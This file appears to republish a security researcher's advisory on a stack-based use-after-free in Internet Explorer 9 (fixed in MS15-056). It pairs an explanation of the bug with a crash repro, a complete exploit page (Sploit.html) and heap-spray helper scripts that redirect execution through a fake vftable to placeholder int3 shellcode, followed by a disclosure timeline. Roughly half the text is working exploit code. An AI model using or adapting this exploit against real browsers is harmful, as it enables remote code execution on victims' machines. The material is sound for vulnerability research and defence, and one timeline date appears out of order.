@@ -1,0 +1,322 @@
+<!--
+Source: http://blog.skylined.nl/20161206001.html
+
+Synopsis
+
+A specially crafted web-page can trigger a memory corruption vulnerability in Microsoft Internet Explorer 9. A pointer set up to point to certain data on the stack can be used after that data has been removed from the stack. This results in a stack-based analog to a heap use-after-free vulnerability. The stack memory where the data was stored can be modified by an attacker before it is used, allowing remote code execution.
+
+Known affected software and attack vectors
+
+Microsoft Internet Explorer 9
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Java­Script should prevent an attacker from triggering the vulnerable code path.
+
+Repro.html:
+
+<!doctype html>
+<script>
+  var o­Window = window.open("about:blank");
+  o­Window.exec­Script('window.o­URIError = new URIError();o­URIError.name = o­URIError;')
+  try { "" + o­Window.o­URIError; } catch(e) { }
+  try { "" + o­Window.o­URIError; } catch(e) { }
+</script>
+
+Description
+
+A Javascript can construct an URIError object and sets that object's name property to refer to the URIError object, creating a circular reference. When that Javascript than attempts to convert the URIError object to a string, MSIE attempts to convert the URIError object's name to a string, which creates a recursive code loop that eventually causes a stack exhaustion.
+
+MSIE attempts to handle this situation gracefully by generating a Java­Script exception. While generating the exception, information about the call stack is gathered using the Javascript­Stack­Walker class. It appears that the code that does this initializes a pointer variable on the stack the first time it is run, but re-uses it if it gets called a second time. Unfortunately, the information the pointer points to is also stored on the stack, but is removed from the stack after the first exception is handled. Careful manipulation of the stack during both exceptions allow an attacker to control the data the pointer points to during the second exception.
+
+This problem is not limited to the URIError object: any recursive function call can be used to trigger the issue, as shown in the exploit below.
+
+Exploit
+
+As mentioned above, the vulnerable pointer points to valid stack memory during the first exception, but it is "popped" from the stack before the second. In order to exploit this vulnerability, the code executed during the first exception is going to point this pointer to a specific area of the stack, while the code executed during the second is going to allocate certain values in that same area before the pointer is re-used.
+
+Control over the stack contents during a stack exhaustion can be achieved by making the recursive calls with many arguments, all of which are stored on the stack. This is similar to a heap-spray storing values on large sections of the heap in that it is not entirely deterministic, but the odds are very highly in favor of you setting a certain value at a certain address.
+
+The exploit triggers the first exception by making recursive calls using a lot of arguments. In each loop, a lot of stack space is needed to make the next call. At some point there will not be enough stack space left to make another call and an exception is thrown. If N arguments are passed during each call, N*4 bytes of stack are needed to store them. The number of bytes left on the stack at the time of the exception varies from 0 to about 4*N and thus averages to about 4*N/2. The vulnerable pointer gets initialized to point to an address near the stack pointer at the time of the exception, at approximately (bottom of stack) + 4*N/2.
+
+The exploit then triggers another stack exhaustion by making recursive calls using many arguments, but significantly less than before. If M arguments are passed during each call this time, the number of bytes left on the stack at the time of the exception averages to about 4*M/2.
+
+When the second exception happens, the vulnerable pointer points inside the stack that was "sprayed" with function arguments. This means we can control where it points to. The pointer is used as an object pointer to get a function address from a vftable, so by using the right value to spray the stack, we can gain full control over execution flow.
+
+The below schematic shows the layout of the stack during the various stages of this exploit:
+
+|                                                                              |
+|<- bottom of stack                                             top of stack ->|
+|                                                                              |
+| Stack layout at the moment the first exception is triggered:                 |
+|                                                                              |
+|                 [--- CALL X ---][-- CALL X-1 --][-- CALL X-2 --][...........]|
+|                                                                              |
+|{---------------} Stack space available is less than 4*N bytes                |
+|                                                                              |
+|                ^^^                                                           |
+|                Vulnerable pointer gets initialized to point around here      |
+|                                                                              |
+|                                                                              |
+|                                                                              |
+| Stack layout at the moment the second exception is triggered:                |
+|                                                                              |
+|    [CALL Y][CALL Y-1][CALL Y-2][CALL Y-3][CALL Y-3][........................]|
+|                                                                              |
+|{--} Stack space available is less than 4*M bytes                             |
+|                                                                              |
+|                ^^^                                                           |
+|                Vulnerable pointer still points around here, most likely at   |
+|                one of the arguments pushed onto the stack in a call.         |
+|                                                                              |
+
+In the Proof-of-Concept code provided below, the first exception is triggered by recursively calling a function with 0x2000 arguments (N = 0x2000). The second exception is triggered by recursively calling a function with 0x200 arguments (M = 0x200). The values passed as arguments during the second stack exhaustion are set to cause the vulnerable pointer to point to a fake vftable on the heap. The heap is sprayed to create this fake vftable. A fake function address is stored at 0x28000201 (p­Target) that points to a dummy shellcode consisting of int3's at 0x28000300 (p­Shellcode). Once the vulnerability is triggered, the vulnerable pointer is used to read the pointer to our shellcode from our fake vftable and called, which will attempt to execute our shellcode.
+
+Sploit.html:
+-->
+
+<!doctype html>
+<script src="String.js"></script>
+<script src="spray­Heap.js"></script>
+<script>
+  function stack­Overflow­High­On­Stack() {
+    stack­Overflow­High­On­Stack.apply(0, new Array(0x2000));
+  }
+  function attack(p­Target) {
+    var ax­Args = [];
+    while (ax­Args.length < 0x200) ax­Args.push((p­Target - 0x69C) >>> 1);
+    exception­Low­On­Stack­With­Spray();
+    function exception­Low­On­Stack­With­Spray() {
+      try {
+        (function(){}).apply(0, ax­Args);
+      } catch (e) {
+        throw 0;
+      }
+      exception­Low­On­Stack­With­Spray.apply(0, ax­Args);
+    }
+  }
+  var p­Spray­Start­Address          = 0x09000000;
+  var d­Heap­Spray­Template = {};
+  var p­Target                     = 0x28000201;
+  var p­Shellcode                  = 0x28000300;
+  d­Heap­Spray­Template[p­Target]     = p­Shellcode;
+  d­Heap­Spray­Template[p­Shellcode]  = 0x­CCCCCCCC;
+  window.s­Heap­Spray­Block = create­Spray­Block(d­Heap­Spray­Template);
+  window.u­Heap­Spray­Block­Count = get­Spray­Block­Count(d­Heap­Spray­Template, p­Spray­Start­Address);
+  var o­Window = window.open("about:blank");
+  function prepare() {
+    window.as­Heap­Spray = new Array(opener.u­Heap­Spray­Block­Count);
+    for (var i = 0; i < opener.u­Heap­Spray­Block­Count; i++) {
+      as­Heap­Spray[i] = (opener.s­Heap­Spray­Block + "A").substr(0, opener.s­Heap­Spray­Block.length);
+    }
+  }
+  o­Window.eval("(" + prepare + ")();");
+  try {
+    String(o­Window.eval("({to­String:" + stack­Overflow­High­On­Stack + "})"));
+  } catch(e) {
+    o­Window.eval("(" + attack + ")(" + p­Target + ")");
+  }
+</script>
+
+<!--
+String.js:
+
+String.from­Word = function (w­Value) {
+  // Return a BSTR that contains the desired DWORD in its string data.
+  return String.from­Char­Code(w­Value);
+}
+String.from­Words = function (aw­Values) {
+  // Return a BSTR that contains the desired DWORD in its string data.
+  return String.from­Char­Code.apply(0, aw­Values);
+}
+String.from­DWord = function (dw­Value) {
+  // Return a BSTR that contains the desired DWORD in its string data.
+  return String.from­Char­Code(dw­Value & 0x­FFFF, dw­Value >>> 16);
+}
+String.from­DWords = function (au­Values) {
+  var as­DWords = new Array(au­Values.length);
+  for (var i = 0; i < au­Values.length; i++) {
+    as­DWords[i] = String.from­DWord(au­Values[i]);
+  }
+  return as­DWords.join("");
+}
+
+String.prototype.repeat = function (u­Count) {
+  // Return the requested number of concatenated copies of the string.
+  var s­Repeated­String = "",
+      u­Left­Most­Bit = 1 << (Math.ceil(Math.log(u­Count + 1) / Math.log(2)) - 1);
+  for (var u­Bit = u­Left­Most­Bit; u­Bit > 0; u­Bit = u­Bit >>> 1) {
+    s­Repeated­String += s­Repeated­String;
+    if (u­Count & u­Bit) s­Repeated­String += this;
+  }
+  return s­Repeated­String;
+}
+String.create­Buffer = function(u­Size, u­Index­Size) {
+  // Create a BSTR of the right size to be used as a buffer of the requested size, taking into account the 4 byte
+  // "length" header and 2 byte "\0" footer. The optional argument u­Index­Size can be 1, 2, 4 or 8, at which point the 
+  // buffer will be filled with indices of said size (this is slower but useful for debugging).
+  if (!u­Index­Size) return "\u­DEAD".repeat(u­Size / 2 - 3);
+  var au­Buffer­Char­Codes = new Array((u­Size - 4) / 2 - 1);
+  var u­MSB = u­Index­Size == 8 ? 8 : 4; // Most significant byte.
+  for (var u­Char­Index = 0, u­Byte­Index = 4; u­Char­Index < au­Buffer­Char­Codes.length; u­Char­Index++, u­Byte­Index +=2) {
+    if (u­Index­Size == 1) {
+      au­Buffer­Char­Codes[u­Char­Index] = u­Byte­Index + ((u­Byte­Index + 1) << 8);
+    } else {
+      // Set high bits to prevents both NULLs and valid pointers to userland addresses.
+      au­Buffer­Char­Codes[u­Char­Index] = 0x­F000 + (u­Byte­Index % u­Index­Size == 0 ? u­Byte­Index & 0x­FFF : 0);
+    }
+  }
+  return String.from­Char­Code.apply([][0], au­Buffer­Char­Codes);
+}
+String.prototype.clone = function () {
+  // Create a copy of a BSTR in memory.
+  s­String = this.substr(0, this.length);
+  s­String.length;
+  return s­String;
+}
+
+String.prototype.replace­DWord = function (u­Byte­Offset, dw­Value) {
+  // Return a copy of a string with the given dword value stored at the given offset.
+  // u­Offset can be a value beyond the end of the string, in which case it will "wrap".
+  return this.replace­Word(u­Byte­Offset, dw­Value & 0x­FFFF).replace­Word(u­Byte­Offset + 2, dw­Value >> 16);
+}
+
+String.prototype.replace­Word = function (u­Byte­Offset, w­Value) {
+  // Return a copy of a string with the given word value stored at the given offset.
+  // u­Offset can be a value beyond the end of the string, in which case it will "wrap".
+  if (u­Byte­Offset & 1) {
+    return this.replace­Byte(u­Byte­Offset, w­Value & 0x­FF).replace­Byte(u­Byte­Offset + 1, w­Value >> 8);
+  } else {
+    var u­Char­Index = (u­Byte­Offset >>> 1) % this.length;
+    return this.substr(0, u­Char­Index) + String.from­Word(w­Value) + this.substr(u­Char­Index + 1);
+  }
+}
+String.prototype.replace­Byte = function (u­Byte­Offset, b­Value) {
+  // Return a copy of a string with the given byte value stored at the given offset.
+  // u­Offset can be a value beyond the end of the string, in which case it will "wrap".
+  var u­Char­Index = (u­Byte­Offset >>> 1) % this.length,
+      w­Value = this.char­Code­At(u­Char­Index);
+  if (u­Byte­Offset & 1) {
+    w­Value = (w­Value & 0x­FF) + ((b­Value & 0x­FF) << 8);
+  } else {
+    w­Value = (w­Value & 0x­FF00) + (b­Value & 0x­FF);
+  }
+  return this.substr(0, u­Char­Index) + String.from­Word(w­Value) + this.substr(u­Char­Index + 1);
+}
+
+String.prototype.replace­Buffer­DWord = function (u­Byte­Offset, u­Value) {
+  // Return a copy of a BSTR with the given dword value store at the given offset.
+  if (u­Byte­Offset & 1) throw new Error("u­Byte­Offset (" + u­Byte­Offset.to­String(16) + ") must be Word aligned");
+  if (u­Byte­Offset < 4) throw new Error("u­Byte­Offset (" + u­Byte­Offset.to­String(16) + ") overlaps BSTR size dword.");
+  var u­Char­Index = u­Byte­Offset / 2 - 2;
+  if (u­Char­Index == this.length - 1) throw new Error("u­Byte­Offset (" + u­Byte­Offset.to­String(16) + ") overlaps BSTR terminating NULL.");
+  return this.substr(0, u­Char­Index) + String.from­DWord(u­Value) + this.substr(u­Char­Index + 2);
+}
+
+spray­Heap.js:
+
+console = window.console || {"log": function(){}};
+function bad(p­Address) {
+  // convert a valid 32-bit pointer to an invalid one that is easy to convert
+  // back. Useful for debugging: use a bad pointer, get an AV whenever it is
+  // used, then fix pointer and continue with exception handled to have see what
+  // happens next.
+  return 0x80000000 + p­Address;
+}
+function blanket(d­Spray_­dw­Value_­p­Address, p­Address) {
+  // Can be used to store values that indicate offsets somewhere in the heap
+  // spray. Useful for debugging: blanket region, get an AV at an address
+  // that indicates where the pointer came from. Does not overwrite addresses
+  // at which data is already stored.
+  for (var u­Offset = 0; u­Offset < 0x40; u­Offset += 4) {
+    if (!((p­Address + u­Offset) in d­Spray_­dw­Value_­p­Address)) {
+      d­Spray_­dw­Value_­p­Address[p­Address + u­Offset] = bad(((p­Address & 0x­FFF) << 16) + u­Offset);
+    }
+  }
+}
+var gu­Spray­Block­Size = 0x02000000; // how much fragmentation do you want?
+var gu­Spray­Page­Size  = 0x00001000; // block alignment.
+
+// Different versions of MSIE have different heap header sizes:
+var s­JSVersion;
+try{
+  /*@cc_­on @*/
+  s­JSVersion = eval("@_jscript_­version");
+} catch(e) {
+  s­JSVersion = "unknown"
+};
+var gu­Heap­Header­Size = {
+    "5.8": 0x24,
+    "9": 0x10, // MSIE9
+    "unknown": 0x10
+}[s­JSVersion]; // includes BSTR length
+var gu­Heap­Footer­Size = 0x04;
+if (!gu­Heap­Header­Size)
+    throw new Error("Unknown script version " + s­JSVersion);
+
+function create­Spray­Block(d­Spray_­dw­Value_­p­Address) {
+  // Create a spray "page" and store spray data at the right offset.
+  var s­Spray­Page = "\u­DEAD".repeat(gu­Spray­Page­Size >> 1);
+  for (var p­Address in d­Spray_­dw­Value_­p­Address) {
+    s­Spray­Page = s­Spray­Page.replace­DWord(p­Address % gu­Spray­Page­Size, d­Spray_­dw­Value_­p­Address[p­Address]);
+  }
+  // Create a spray "block" by concatinated copies of the spray "page", taking into account the header and footer
+  // used by MSIE for larger heap allocations.
+  var u­Spray­Pages­Per­Block = Math.ceil(gu­Spray­Block­Size / gu­Spray­Page­Size);
+  var s­Spray­Block = (
+    s­Spray­Page.substr(gu­Heap­Header­Size >> 1) +
+    s­Spray­Page.repeat(u­Spray­Pages­Per­Block - 2) +
+    s­Spray­Page.substr(0, s­Spray­Page.length - (gu­Heap­Footer­Size >> 1))
+  );
+  var u­Actual­Spray­Block­Size = gu­Heap­Header­Size + s­Spray­Block.length * 2 + gu­Heap­Footer­Size;
+  if (u­Actual­Spray­Block­Size != gu­Spray­Block­Size)
+      throw new Error("Assertion failed: spray block (" + u­Actual­Spray­Block­Size.to­String(16) + ") should be " + gu­Spray­Block­Size.to­String(16) + ".");
+  console.log("create­Spray­Block():");
+  console.log("  s­Spray­Page.length: " + s­Spray­Page.length.to­String(16));
+  console.log("  u­Spray­Pages­Per­Block: " + u­Spray­Pages­Per­Block.to­String(16));
+  console.log("  s­Spray­Block.length: " + s­Spray­Block.length.to­String(16));
+  return s­Spray­Block;
+}
+function get­Heap­Block­Index­For­Address(p­Address) {
+  return ((p­Address % gu­Spray­Page­Size) - gu­Heap­Header­Size) >> 1;
+}
+function get­Spray­Block­Count(d­Spray_­dw­Value_­p­Address, p­Start­Address) {
+  p­Start­Address = p­Start­Address || 0;
+  var p­Target­Address = 0x0;
+  for (var p­Address in d­Spray_­dw­Value_­p­Address) {
+    p­Target­Address = Math.max(p­Target­Address, p­Address);
+  }
+  u­Spray­Blocks­Count = Math.ceil((p­Target­Address - p­Start­Address) / gu­Spray­Block­Size);
+  console.log("get­Spray­Block­Count():");
+  console.log("  p­Target­Address: " + p­Target­Address.to­String(16));
+  console.log("  u­Spray­Blocks­Count: " + u­Spray­Blocks­Count.to­String(16));
+  return u­Spray­Blocks­Count;
+}
+function spray­Heap(d­Spray_­dw­Value_­p­Address, p­Start­Address) {
+  var u­Spray­Blocks­Count = get­Spray­Block­Count(d­Spray_­dw­Value_­p­Address, p­Start­Address);
+  // Spray the heap by making copies of the spray "block".
+  var as­Spray = new Array(u­Spray­Blocks­Count);
+  as­Spray[0] = create­Spray­Block(d­Spray_­dw­Value_­p­Address);
+  for (var u­Index = 1; u­Index < as­Spray.length; u­Index++) {
+    as­Spray[u­Index] = as­Spray[0].clone();
+  }
+  return as­Spray;
+}
+Time-line
+13 October 2012: This vulnerability was found through fuzzing.
+29 October 2012: This vulnerability was submitted to EIP.
+18 November 2012: This vulnerability was submitted to ZDI.
+27 November 2012: EIP declines to acquire this vulnerability because they believe it to be a copy of another vulnerability they already acquired.
+7 December 2012: ZDI declines to acquire this vulnerability because they believe it not to be exploitable.
+
+During the initial report detailed above, I did not have a working exploit to prove exploitability. I also expected the bug to be fixed soon, seeing how EIP believed they already reported it to Microsoft. However, about two years later, I decided to look at the issue again and found it had not yet been fixed. Apparently it was not the same issue that EIP reported to Microsoft. So, I decided to try to have another look and developed a Proof-of-Concept exploit.
+
+April 2014: I start working on this case again, and eventually develop a working Proof-of-Concept exploit.
+6 November 2014: ZDI was informed of the new analysis and reopens the case.
+15 November 2014: This vulnerability was submitted to i­Defense.
+16 November 2014: i­Defense responds to my report email in plain text, potentially exposing the full vulnerability details to world+dog.
+17 November 2014: ZDI declines to acquire this vulnerability after being informed of the potential information leak.
+11 December 2012: This vulnerability was acquired by i­Defense.
+The accidentally potential disclosure of vulnerability details by i­Defense was of course a bit of a disappointment. They reported that they have since updated their email system to automatically encrypt emails, which should prevent this from happening again.
+
+9 June 2015: Microsoft addresses this vulnerability in MS15-056.
+6 December 2016: Details of this vulnerability are released.
+-->
